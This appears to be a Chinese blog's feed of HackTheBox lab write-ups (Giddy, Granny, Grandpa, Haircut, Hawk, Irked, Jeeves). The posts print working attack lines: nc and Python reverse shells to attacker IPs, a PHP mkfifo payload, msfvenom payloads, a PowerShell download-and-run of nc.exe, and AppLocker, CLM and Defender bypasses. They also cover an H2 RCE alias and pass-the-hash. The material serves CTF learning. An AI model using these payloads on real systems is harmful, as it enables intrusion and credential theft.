<p><img src="/images/Giddy/11.png" alt="11"></p>
<p>john可以破解出它们xNnWo6272k7x</p>
<p>之后去登录powershell web access，如果直接登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Stacy</span><br><span class="line">xNnWo6272k7x</span><br><span class="line">GIDDY</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/12.png" alt="12"></p>
<p>会出错，要避免域登录，所以需要指定本地登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIDDY\Stacy</span><br><span class="line">xNnWo6272k7x</span><br><span class="line">GIDDY</span><br></pre></td></tr></table></figure>

<p>获得shell</p>
<p><img src="/images/Giddy/13.png" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>机器拥有app-locker</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-AppLockerPolicy -Local</span><br></pre></td></tr></table></figure>

<p>所以无法与WMIC进行交互来枚举服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/16.png" alt="16"></p>
<p>发现unifi video</p>
<p><img src="/images/Giddy/14.png" alt="14"></p>
<p>找到提权漏洞</p>
<p><img src="/images/Giddy/15.png" alt="15"></p>
<p>阅读它了解到了提权流程</p>
<p>由于错误的配置，我们拥有<code>C:\ProgramData\unifi-video</code>目录的写权限，<code>Ubiquiti UniFi Video</code>服务启动时会加载<code>C:\\ProgramData\\unifi-video\\taskkill.exe</code>，而这个<code>taskkill.exe</code>是不存在的，我们可以伪造一个<code>taskill.exe</code>的reverse_shell来获得system权限</p>
<p>尝试反向shell的时候发现，windows defender</p>
<p><img src="/images/Giddy/17.png" alt="17"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Operation did not complete successfully because the file contains a virus or potentially unwanted software</span><br></pre></td></tr></table></figure>

<p>可以编译一个.net的reverse_shell来绕过defender</p>
<p>首先查看目标机器的.net版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir C:\windows\microsoft.net\framework</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/18.png" alt="18"></p>
<p>项目地址:<a href="https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc">https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc</a></p>
<p>创建C#项目</p>
<p><img src="/images/Giddy/19.png" alt="19"></p>
<p>修改IP并编译</p>
<p><img src="/images/Giddy/20.png" alt="20"></p>
<p>传输到目标机器上，并命名为taskkill.exe</p>
<p>现在需要枚举服务名，这一部有些困难，正常的枚举会受到权限的限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x2F;c sc query state&#x3D;all</span><br><span class="line">Get-WmiObject win32_service</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/21.png" alt="21"></p>
<p>学到到注册表枚举服务，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Location &#39;HKLM:\SYSTEM\CurrentControlSet\Services\&#39;</span><br><span class="line">Get-ChildItem</span><br><span class="line">Get-ChildItem . | Where-Object &#123; $_.Name -like &#39;*UniFiVideoService*&#39; &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/22.png" alt="22"></p>
<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/23.png" alt="23"></p>
<p>之后就可以启动/关闭服务即可，一次不行就多尝试几次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stop-service &quot;Ubiquiti UniFi Video&quot;</span><br><span class="line">start-service &quot;Ubiquiti UniFi Video&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/24.png" alt="24"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>两个有意思的trick</p>
<h3 id="bypass-applocker"><a href="#bypass-applocker" class="headerlink" title="bypass applocker"></a>bypass applocker</h3><p><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a></p>
<p>正常目录无法运行程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This program is blocked by group policy. For more information, contact your system administrato</span><br></pre></td></tr></table></figure>

<p>但是到上面名单的目录，默认是所有用户可写，就可以绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\spool\drivers\color</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/26.png" alt="26"></p>
<h3 id="bypass-powershell-Constrained-Language-Mode"><a href="#bypass-powershell-Constrained-Language-Mode" class="headerlink" title="bypass powershell Constrained Language Mode"></a>bypass powershell Constrained Language Mode</h3><p>如果直接加载powershell代码，比如powerup，会出现问题</p>
<p><img src="/images/Giddy/27.png" alt="27"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cannot create type. Only core types are supported in this language mode.</span><br></pre></td></tr></table></figure>

<p>可以验证CLM是否启用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ExecutionContext.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>

<p>这种情况，http请求都发不出去，先要绕过powershell CLM，链接:<a href="https://github.com/padovah4ck/PSByPassCLM">https://github.com/padovah4ck/PSByPassCLM</a></p>
<p>把<code>PsBypassCLM.exe</code>保存在目标的目录上，也是无法直接运行的</p>
<p><img src="/images/Giddy/28.png" alt="28"></p>
<p>使用下面语法，修改ip、端口、路径，可以得到一个reverse_shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;true &#x2F;revshell&#x3D;true &#x2F;rhost&#x3D;10.10.16.98 &#x2F;rport&#x3D;443 &#x2F;U C:\Users\Stacy\Documents\PsBypassCLM.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Giddy/29.png" alt="29"></p>
<p>在这个shell下，可以绕过CLM</p>
<p><img src="/images/Giddy/30.png" alt="30"></p>
<p>语句被成功加载</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Granny</title>
    <url>/2020/06/11/HTB-Granny/</url>
    <content><![CDATA[<h1 id="Granny"><a href="#Granny" class="headerlink" title="Granny"></a>Granny</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Granny/1.jpg" alt="1"></p>
<p>只开放了80端口，并且存在webdav服务，并且webdav开放了许多HTTP方法，这是非常危险的</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口没有其他的web服务，目录扫描也没有有价值的信息</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="webdav"><a href="#webdav" class="headerlink" title="webdav"></a>webdav</h3><p>使用davtest看看什么文件能上传/执行</p>
<p><img src="/images/Granny/2.jpg" alt="2"></p>
<p>发现aspx上传失败了，不过该服务还支持move方法，那只要上传符合的格式改名，应该就可以执行</p>
<p>先做个木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp lhost&#x3D;10.10.16.123 lport&#x3D;4444 -f aspx -o evil.txt</span><br></pre></td></tr></table></figure>

<p>再用cadaver上传上去</p>
<p><img src="/images/Granny/3.jpg" alt="3"></p>
<p>然后就可以getshell了</p>
<p><img src="/images/Granny/4.jpg" alt="4"></p>
<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><p>这次powershell没法用，所以就没用sherlock，使用Windows-Exploit-Suggester</p>
<p><img src="/images/Granny/5.jpg" alt="5"></p>
<p>发现了很多提权漏洞，逐个尝试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ms09-020.exe &quot;nc.exe -nv 10.10.16.123 5555 -e cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Granny/6.jpg" alt="6"></p>
<p>最后通过ms09-020，成功提权</p>
<p><img src="/images/Granny/7.jpg" alt="7"></p>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>首先使用iis_webdav_upload_asp获取低权限shell</p>
<p><img src="/images/Granny/8.jpg" alt="8"></p>
<p>使用提权脚本查看漏洞</p>
<p><img src="/images/Granny/9.jpg" alt="9"></p>
<p>尝试使用ms15_051_client_copy_image，不过失败了</p>
<p>使用migrate，迁移到一个更稳定的进程</p>
<p><img src="/images/Granny/10.jpg" alt="10"></p>
<p>经过尝试，成功提权</p>
<p><img src="/images/Granny/12.jpg" alt="12"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Grandpa</title>
    <url>/2020/06/16/HTB-Grandpa/</url>
    <content><![CDATA[<h1 id="Grandpa"><a href="#Grandpa" class="headerlink" title="Grandpa"></a>Grandpa</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Grandpa/1.jpg" alt="1"></p>
<p>目标服务器IIS6.0，开启服务webdav</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>davtest</p>
<p><img src="/images/Grandpa/2.jpg" alt="2"></p>
<p>无法上传任何格式的文件</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="不使用metasploit"><a href="#不使用metasploit" class="headerlink" title="不使用metasploit"></a>不使用metasploit</h3><p>寻找公开漏洞</p>
<p><img src="/images/Grandpa/3.jpg" alt="3"></p>
<p>ScStoragePathFromUrl的缓冲区溢出是个不错的选择</p>
<p>不过这个py要修改的太多，还需要替换shellcode</p>
<p>在github上找了另一个方便利用的脚本CVE-2017-7269</p>
<p><a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python iis6-reverse-shell.py 10.10.10.14 80 10.10.16.173 4444</span><br></pre></td></tr></table></figure>

<p><img src="/images/Grandpa/4.jpg" alt="4"></p>
<p>成功获取shell</p>
<h3 id="使用metasploit"><a href="#使用metasploit" class="headerlink" title="使用metasploit"></a>使用metasploit</h3><p>windows/iis/iis_webdav_scstoragepathfromurl</p>
<p><img src="/images/Grandpa/5.jpg" alt="5"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用CVE-2009-0079进行提权</p>
<p><a href="https://github.com/Re4son/Churrasco">https://github.com/Re4son/Churrasco</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">churrasco.exe -d &quot;nc.exe -nv 10.10.16.173 5555 -e cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Grandpa/7.jpg" alt="7"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Haircut</title>
    <url>/2020/10/20/HTB-Haircut/</url>
    <content><![CDATA[<h1 id="Haircut"><a href="#Haircut" class="headerlink" title="Haircut"></a>Haircut</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Haircut/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Haircut/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>uploads目录无法访问</p>
<p><img src="/images/Haircut/8.png" alt="8"></p>
<p>检查exposed.php</p>
<p><img src="/images/Haircut/2.png" alt="2"></p>
<p>看样子是一个输入url的地方，考虑命令注入、SSRF、RFI之类的漏洞</p>
<p>尝试输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.16.98&#x2F;test.php</span><br></pre></td></tr></table></figure>

<p>发现得到了请求</p>
<p><img src="/images/Haircut/3.png" alt="3"></p>
<p>查看网页代码</p>
<p><img src="/images/Haircut/6.png" alt="6"></p>
<p>发现页面的内容被读取，但没被解释，不过看上面的<code>% Total    % Received % Xferd  Average Speed</code> 之类的提示，感觉这里是一个CURL命令</p>
<p>常规的命令注入无法实现</p>
<p><img src="/images/Haircut/7.png" alt="7"></p>
<p>并没有做过多的绕过尝试，因为竟然是curl命令 ，考虑o参数写入文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.16.98&#x2F;test.php -o a.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haircut/4.png" alt="4"></p>
<p>得到permission denied，不过还枚举出了<code>uploads</code>目录，尝试写入改目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.16.98&#x2F;test.php -o .&#x2F;uploads&#x2F;a.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haircut/9.png" alt="9"></p>
<p>成功，这样就能轻易获得shell了</p>
<p><img src="/images/Haircut/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Haircut/11.png" alt="11"></p>
<p>screen 4.5.0提权，参考<code>靶场Wintermute</code></p>
<p>编译报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc: error trying to exec &#39;cc1&#39;: execvp: No such file or directory</span><br></pre></td></tr></table></figure>

<p>尝试解决，但失败了，所以只能在本地编译传输过去，不过这两个程序都很简单，应该问题不大</p>
<p><img src="/images/Haircut/12.png" alt="12"></p>
<p>o参数的bypass和screen提权都遇到过，10分钟就完成了:)</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Hawk</title>
    <url>/2020/06/28/HTB-Hawk/</url>
    <content><![CDATA[<h1 id="Hawk"><a href="#Hawk" class="headerlink" title="Hawk"></a>Hawk</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Hawk/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>8082端口无法远程访问</p>
<p><img src="/images/Hawk/18.jpg" alt="18"></p>
<p>nmap发现21允许匿名登录，看看有什么</p>
<p><img src="/images/Hawk/2.jpg" alt="2"></p>
<p>发现了隐藏文件</p>
<p><img src="/images/Hawk/4.jpg" alt="4"></p>
<p>不过该文件进行了openssl加盐加密，显示为base64编码后的内容</p>
<p>先运行解码</p>
<p><img src="/images/Hawk/5.jpg" alt="5"></p>
<p>解码后发现，<code>Salted__kY</code>称为唯一可识别字符串</p>
<h4 id="openssl破解思路"><a href="#openssl破解思路" class="headerlink" title="openssl破解思路"></a>openssl破解思路</h4><p>这个方法来自官方writeup</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wc -c drupal_decode.txt.enc</span><br></pre></td></tr></table></figure>

<p>发现它的大小为176字节，如果它能被8整除，说明很有可能是分组密码</p>
<p>我们创建8字节-176字节的明文，步长为8</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in $(seq 0 8 173); do python -c &quot;print &#39;A&#39;*$i&quot; &gt; $i ;done</span><br></pre></td></tr></table></figure>

<p>创建一个文件保存准备使用的加密算法<code>cipher.lst</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-aes-256-cbc</span><br><span class="line">-aes-128-cbc</span><br><span class="line">-aes-256-ecb</span><br><span class="line">-aes-128-cbc</span><br><span class="line">-aes-256-ofb</span><br><span class="line">-aes-128-ofb</span><br><span class="line">-rc4</span><br><span class="line">-rc4-cbc</span><br><span class="line">-aria-128-cbc</span><br><span class="line">-des</span><br></pre></td></tr></table></figure>

<p>之后使用bash脚本，把每个明文从8到176全部加密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">for cipher in $(cat cipher.lst); do</span><br><span class="line">        for length in $(ls | grep &quot;^[0-9]\?[0-9]\?[0-9]\?$&quot;); do</span><br><span class="line">echo            openssl enc $cipher -e -in $length -out $length$cipher.enc -k PleaseSubscribe</span><br><span class="line">        done</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/6.jpg" alt="6"></p>
<p>之后过滤大小也为176字节的密文</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls *.enc |xargs wc -c|grep &#39;176 &#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/7.jpg" alt="7"></p>
<p>这些加密算法有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aes-128-cbc</span><br><span class="line">aes-256-cbc</span><br><span class="line">aes-256-ecb</span><br><span class="line">aria-128-cbc</span><br><span class="line">des</span><br></pre></td></tr></table></figure>

<p>在这其中，aes-256-cbc是最为常用的加密算法</p>
<p>使用<code>bruteforce-salted-openssl</code>进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bruteforce-salted-openssl -f &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt drupal_decode.txt.enc -c aes-256-cbc -d sha256</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/8.jpg" alt="8"></p>
<p>最后解出口令为friends</p>
<p>最后还原即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl aes-256-cbc -d -in drupal_decode.txt.enc -out plain.txt -k friends</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/9.jpg" alt="9"></p>
<p>得到了账户和密码</p>
<p>看了看别的方法，好像这个也能解密，<a href="https://github.com/HrushikeshK/openssl-bruteforce">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python brute.py &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt ciphers.txt drupal.txt.enc 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用账号密码进行登录，但账户并不是上述提到的Daniel<br>尝试<code>admin/PencilKeyboardScanner123</code>成功登录</p>
<p>接下里就是常规操作</p>
<p><img src="/images/Hawk/10.jpg" alt="10"></p>
<p>插入payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.100 4444 &gt;&#x2F;tmp&#x2F;f&quot;); ?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/11.jpg" alt="11"></p>
<p>点下save的一瞬间，getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>可以寻找drupal的数据库配置文件，获取敏感信息</p>
<p><img src="/images/Hawk/12.jpg" alt="12"></p>
<p>提权脚本没找到，应该是存放目录错了</p>
<p>切到web目录里寻找</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name settings.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/13.jpg" alt="13"></p>
<p>找到了</p>
<p><img src="/images/Hawk/14.jpg" alt="14"></p>
<p>发现了mysql连接文件</p>
<p><img src="/images/Hawk/15.jpg" alt="15"></p>
<p>连接成功</p>
<p><img src="/images/Hawk/16.jpg" alt="16"></p>
<p>在drupal库的users表里发现了admin的密码hash</p>
<p>hashcat支持Drupal7的hash加密(-m 7900)，不过破解不出</p>
<p>这里有坑，mysql的连接密码<code>drupal4hawk</code>是用户<code>daniel</code>的ssh密码，是一个密码复用的问题…</p>
<p><img src="/images/Hawk/17.jpg" alt="17"></p>
<p>登录进去是一个python会话，直接逃出去</p>
<p>想到之前的8082端口还没用</p>
<p><img src="/images/Hawk/19.jpg" alt="19"></p>
<p>应该是只允许本地访问</p>
<p><img src="/images/Hawk/20.jpg" alt="20"></p>
<p>而且在以root的身份运行</p>
<h3 id="方法1端口转发"><a href="#方法1端口转发" class="headerlink" title="方法1端口转发"></a>方法1端口转发</h3><p>利用端口转发，来进行访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -NL 7777:127.0.0.1:8082 daniel@10.10.10.102</span><br><span class="line">drupal4hawk</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/21.jpg" alt="21"></p>
<p>利用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;;  &#125;$$;</span><br><span class="line">CALL SHELLEXEC(&#39;id&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/22.jpg" alt="22"></p>
<p>RCE成功</p>
<p>我们利用之前的低权限用户在tmp目录写一个反弹shell的py脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.16.100&#39;,5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; &gt; evil.py</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/23.jpg" alt="23"></p>
<p>调用RCE执行，成功获取root</p>
<h3 id="方法2searchsploit"><a href="#方法2searchsploit" class="headerlink" title="方法2searchsploit"></a>方法2searchsploit</h3><p><img src="/images/Hawk/24.jpg" alt="24"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 45506.py -H 127.0.0.1:8082</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/25.jpg" alt="25"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Irked</title>
    <url>/2020/06/26/HTB-Irked/</url>
    <content><![CDATA[<h1 id="Irked"><a href="#Irked" class="headerlink" title="Irked"></a>Irked</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Irked/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>发现目标安装了IRC，这是一个在线聊天室软件，我们对它的版本进行检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">irssi -c 10.10.10.117 --port 8067</span><br></pre></td></tr></table></figure>

<p><img src="/images/Irked/2.jpg" alt="2"></p>
<p>发现软件版本</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>搜索公开漏洞</p>
<p><img src="/images/Irked/4.jpg" alt="4"></p>
<p>修改13853.pl的payload，但死活用不了<br>找到了一个python3的exp，<a href="https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/master/exploit.py">链接</a></p>
<p>修改exp为我想用的reverse_shell</p>
<p><img src="/images/Irked/5.jpg" alt="5"></p>
<p>之后运行脚本即可</p>
<p><img src="/images/Irked/6.jpg" alt="6"></p>
<p>阅读代码后发现，直接用nc发一句话也可以获取shell，啥脚本也不要用</p>
<p><img src="/images/Irked/3.jpg" alt="3"></p>
<p>成功getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在目录里发现了备份文件</p>
<p><img src="/images/Irked/7.jpg" alt="7"></p>
<p>似乎保存了某样密码</p>
<p><img src="/images/Irked/8.jpg" alt="8"></p>
<p>可以用这个密码，解开80端口图片的隐写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss</span><br></pre></td></tr></table></figure>

<p><img src="/images/Irked/9.jpg" alt="9"></p>
<p>正好在机器里发现了其他用户，尝试ssh登录</p>
<p><img src="/images/Irked/10.jpg" alt="10"></p>
<p>成功登录</p>
<p><img src="/images/Irked/11.jpg" alt="11"></p>
<p>之后发现了某个SUID程序</p>
<p><img src="/images/Irked/12.jpg" alt="12"></p>
<p>进行文件传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64 -w0 viewuser</span><br></pre></td></tr></table></figure>

<p>复制到pass.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64 -d pass.txt &gt; viewuser</span><br><span class="line">chmod +x viewuser</span><br><span class="line">file viewuser</span><br><span class="line">ltrace .&#x2F;viewuser</span><br></pre></td></tr></table></figure>

<p><img src="/images/Irked/13.jpg" alt="13"></p>
<p>使用ltrace分析行为，我们可以发现这是一个可执行文件，并且会执行 /tmp/listusers</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>直接调用/usr/bin/viewuser就可以触发bash脚本</p>
<p><img src="/images/Irked/14.jpg" alt="14"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Jeeves</title>
    <url>/2020/07/01/HTB-Jeeves/</url>
    <content><![CDATA[<h1 id="Jeeves"><a href="#Jeeves" class="headerlink" title="Jeeves"></a>Jeeves</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Jeeves/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>对80和50000进行枚举，首页都没有价值的信息，进行目录枚举</p>
<p><img src="/images/Jeeves/2.jpg" alt="2"></p>
<p>在50000端口发现有意思的目录</p>
<p><img src="/images/Jeeves/7.jpg" alt="7"></p>
<p>发现jenkins 2.87</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p><img src="/images/Jeeves/3.jpg" alt="3"></p>
<p><img src="/images/Jeeves/4.jpg" alt="4"></p>
<p>插入执行的系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.16.98&#x2F;nc.exe&#39;,&#39;%temp%\nc.exe&#39;)&quot;</span><br><span class="line">%temp%\nc.exe 10.10.16.98 4444 -e cmd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Jeeves/5.jpg" alt="5"></p>
<p>点击build now</p>
<p><img src="/images/Jeeves/6.jpg" alt="6"></p>
<p>成功getshell</p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p><img src="/images/Jeeves/8.jpg" alt="8"></p>
<p><img src="/images/Jeeves/9.jpg" alt="9"></p>
<p>之后会看到执行<code>groovy</code>命令的控制台，谷歌搜索<code>Groovy executing shell commands</code>你就会找到执行系统命令的方法</p>
<p><img src="/images/Jeeves/10.jpg" alt="10"></p>
<p>RCE成功，现在弹个shell回来</p>
<p><img src="/images/Jeeves/11.jpg" alt="11"></p>
<p>getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Jeeves/12.jpg" alt="12"></p>
<p>发现了CEH.kdbx这个文件，传递到kali</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy CEH.kdbx \\10.10.16.98\a\</span><br></pre></td></tr></table></figure>

<p>使用john解密keepass</p>
<p><img src="/images/Jeeves/13.jpg" alt="13"></p>
<p>得到密码moonshine1</p>
<p>安装keepass2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install keypass2</span><br></pre></td></tr></table></figure>

<p>之后打开keepass输入密码moonshine1</p>
<p><img src="/images/Jeeves/14.jpg" alt="14"></p>
<p>成功获取密码</p>
<p>使用pth-winexe传递hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pth-winexe -U Administrator &#x2F;&#x2F;10.10.10.63 &quot;cmd.exe&quot;</span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span><br></pre></td></tr></table></figure>

